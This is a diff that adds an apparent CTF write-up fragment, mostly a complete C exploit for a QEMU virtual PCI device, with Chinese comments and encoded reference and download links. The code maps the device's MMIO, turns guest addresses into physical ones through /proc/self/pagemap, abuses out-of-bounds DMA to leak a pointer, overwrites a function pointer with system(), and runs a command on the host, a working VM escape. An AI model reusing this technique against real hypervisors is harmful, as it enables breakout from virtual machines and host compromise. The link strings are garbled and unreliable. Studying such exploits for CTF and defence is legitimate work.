@@ -1,0 +1,216 @@
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <errno.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <ctype.h>
+#include <termios.h>
+#include <assert.h>
+
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <sys/io.h>
+
+#define MAP_SIZE 4096UL
+#define MAP_MASK (MAP_SIZE - 1)
+
+#define DMA_BASE 0x40000
+
+#define PAGE_SHIFT  12
+#define PAGE_SIZE   (1 << PAGE_SHIFT)
+#define PFN_PRESENT (1ull << 63)
+#define PFN_PFN     ((1ull << 55) - 1)
+
+char *pci_device_name = "/sys/devices/pci0000:00/0000:00:04.0/resource0";
+
+unsigned char *tmpbuf;
+uint64_t tmpbuf_phys_addr;
+unsigned char *mmio_base;
+
+unsigned char *getMMIOBase(){
+    int fd;
+    if ((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) {
+        perror("open pci device");
+        exit(-1);
+    }
+    mmio_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (mmio_base == (void *) -1) {
+        perror("mmap");
+        exit(-1);
+    }
+    return mmio_base;
+}
+
+// 获取页内偏移
+uint32_t page_offset(uint32_t addr)
+{
+    // addr & 0xfff
+    return addr & ((1 << PAGE_SHIFT) - 1);
+}
+
+uint64_t gva_to_gfn(void *addr)
+{
+    uint64_t pme, gfn;
+    size_t offset;
+
+    int fd;
+    fd = open("/proc/self/pagemap", O_RDONLY);
+    if (fd < 0) {
+        perror("open");
+        exit(1);
+    }
+
+    // printf("pfn_item_offset : %p\n", (uintptr_t)addr >> 9);
+    offset = ((uintptr_t)addr >> 9) & ~7;
+
+    //// 下面是网上其他人的代码，只是为了理解上面的代码
+    // 一开始除以 0x1000 （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了，
+    // pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址
+    // 最终 vir/2^12 * 8 = (vir / 2^9) & ~7
+    // 这跟上面的右移9正好对应，但是为什么要 & ~7 ,因为你  vir >> 12 << 3 , 跟vir >> 9 是有区别的，vir >> 12 << 3低3位肯定是0，所以通过& ~7将低3位置0
+    // int page_size=getpagesize();
+    // unsigned long vir_page_idx = vir/page_size;
+    // unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t);
+
+    lseek(fd, offset, SEEK_SET);
+    read(fd, &pme, 8);
+    // 确保页面存在——page is present.
+    if (!(pme & PFN_PRESENT))
+        return -1;
+    // physical frame number
+    gfn = pme & PFN_PFN;
+    return gfn;
+}
+
+uint64_t gva_to_gpa(void *addr)
+{
+    uint64_t gfn = gva_to_gfn(addr);
+    assert(gfn != -1);
+    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
+}
+
+void mmio_write(uint64_t addr, uint64_t value)
+{
+    *((uint64_t *)(mmio_base + addr)) = value;
+}
+
+uint64_t mmio_read(uint64_t addr)
+{
+    return *((uint64_t *)(mmio_base + addr));
+}
+
+void set_cnt(uint64_t val)
+{
+    mmio_write(144, val);
+}
+
+void set_src(uint64_t val)
+{
+    mmio_write(128, val);
+}
+
+void set_dst(uint64_t val)
+{
+    mmio_write(136, val);
+}
+
+void start_dma_timer(uint64_t val){
+    mmio_write(152, val);
+}
+
+void dma_read(uint64_t offset, uint64_t  cnt){
+    // 设置dma_buf的索引
+    set_src(DMA_BASE + offset);
+    // 设置读取后要写入的物理地址
+    set_dst(tmpbuf_phys_addr);
+    // 设置读取的大小
+    set_cnt(cnt);
+    // 触发hitb_dma_timer
+    start_dma_timer(1|2);
+    // 等待上面的执行完
+    sleep(1);
+}
+
+void dma_write(uint64_t offset, char *buf, uint64_t  cnt)
+{
+    // 将我们要写的内容先复制到tmpbuf
+    memcpy(tmpbuf, buf, cnt);
+    // 设置物理地址（要从这读取写到dma_buf[opaque->dma.dst-0x40000]）
+    set_src(tmpbuf_phys_addr);
+    // 设置dma_buf的索引
+    set_dst(DMA_BASE + offset);
+    // 设置写入大小
+    set_cnt(cnt);
+    // 触发hitb_dma_timer
+    start_dma_timer(1);
+    // 等待上面的执行完
+    sleep(1);
+}
+
+void dma_write_qword(uint64_t offset, uint64_t val)
+{
+    dma_write(offset, (char *)&val, 8);
+}
+
+void dma_enc_read(uint64_t offset, uint64_t  cnt)
+{
+    // 设置dma_buf的索引
+    set_src(DMA_BASE + offset);
+    // 设置读取后要写入的物理地址
+    set_dst(tmpbuf_phys_addr);
+    // 设置读取的大小
+    set_cnt(cnt);
+    // 触发hitb_dma_timer
+    start_dma_timer(1|2|4);
+    // 等待上面的执行完
+    sleep(1);
+}
+
+int main(int argc, char const *argv[])
+{
+    getMMIOBase();
+    printf("mmio_base Resource0Base: %p\n", mmio_base);
+
+    tmpbuf = malloc(0x1000);
+    tmpbuf_phys_addr = gva_to_gpa(tmpbuf);
+    printf("gva_to_gpa tmpbuf_phys_addr %p\n", (void *)tmpbuf_phys_addr);
+
+    printf("tmpbuf: %p\n", tmpbuf);
+    printf("&tmpbuf: %p\n", &tmpbuf);
+
+    // 将enc函数指针写到tmpbuf_phys_addr,之后通过tmpbuf读出即可
+    dma_read(4096, 8);
+    uint64_t hitb_enc_addr = *((uint64_t *)tmpbuf);
+    uint64_t binary_base_addr = hitb_enc_addr - 0x283DD0;
+    uint64_t system_addr = binary_base_addr + 0x1FDB18;
+    printf("hitb_enc_addr: 0x%lx\n", hitb_enc_addr);
+    printf("binary_base_addr: 0x%lx\n", binary_base_addr);
+    printf("system_addr: 0x%lx\n", system_addr);
+
+    // 覆盖enc函数指针为system地址
+    dma_write_qword(4096, system_addr);
+    char *command = "cat flag";
+    dma_write(0x200, command, strlen(command));
+
+    // 触发hitb_dma_timer中的enc函数,从而调用syetem
+    dma_enc_read(0x200, 666);
+
+    return 0;
+}
+```
+
+参考链接：
+
+- 259K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5N6h3q4F1P5s2g2S2L8X3u0D9K9h3&6Y4j5X3I4A6L8X3N6Q4x3X3g2Y4K9i4c8Z5N6h3u0Q4x3X3g2A6L8#2)9J5c8X3y4@1k6W2)9J5c8Y4m8%4L8W2)9J5c8U0t1H3x3U0u0Q4x3V1j5H3y4W2)9J5c8U0l9&6i4K6u0r3M7h3g2E0N6g2)9J5c8R3.
+- c47K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1#2y4o6V1H3y4W2)9J5x3$3R3K6i4K6u0V1y4b7.
+- 034K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2Y4K9h3q4F1N6r3u0J5j5h3&6U0K9q4)9J5k6h3y4F1i4K6u0r3x3U0l9I4z5g2)9J5c8U0l9%4i4K6u0r3x3e0N6Q4x3V1k6h3e0g2)9J5y4e0t1H3k6i4y4U0j5i4m8W2i4K6t1#2x3U0m8Q4x3U0g2q4y4q4)9J5y4f1t1&6i4K6t1#2z5p5u0Q4x3U0f1J5x3q4q4q4e0g2g2Q4x3U0f1J5x3p5y4S2M7$3g2Q4x3U0f1J5x3q4y4@1N6h3c8&6i4K6u0r3
+- a72K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2Y4K9h3q4F1N6r3u0J5j5h3&6U0K9q4)9J5k6h3y4F1i4K6u0r3x3U0l9J5x3q4)9J5c8U0l9I4i4K6u0r3x3o6u0Q4x3V1k6o6g2p5k6Q4x3U0f1J5x3q4q4q4e0g2g2Q4x3U0f1J5x3q4)9J5y4f1f1^5i4K6t1#2z5e0W2Q4x3U0f1&6b7g2)9J5y4f1f1$3i4K6t1#2z5p5u0Q4x3U0f1&6c8W2)9J5y4f1f1$3i4K6t1#2z5f1y4Q4x3U0g2n7b7g2)9J5y4f1f1&6i4K6t1#2z5o6m8Q4x3U0f1^5x3#2)9J5y4f1f1&6i4K6t1#2z5o6m8Q4x3U0g2n7z5q4)9J5y4f1f1@1i4K6t1#2b7U0W2Q4x3U0f1^5b7V1S2u0g2p5u0Q4x3X3c8s2f1@1g2o6i4K6u0V1x3U0l9I4y4#2)9J5k6r3u0S2j5Y4W2I4k6h3#2#2i4K6u0r3
+
+题目下载地址
+
+链接: 249K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4N6W2k6B7d9U0k6G2K9p5S2s2j5g2A6f1b7g2k6X3c8o6j5^5e0%4u0D9f1b7. 提取码: eeee
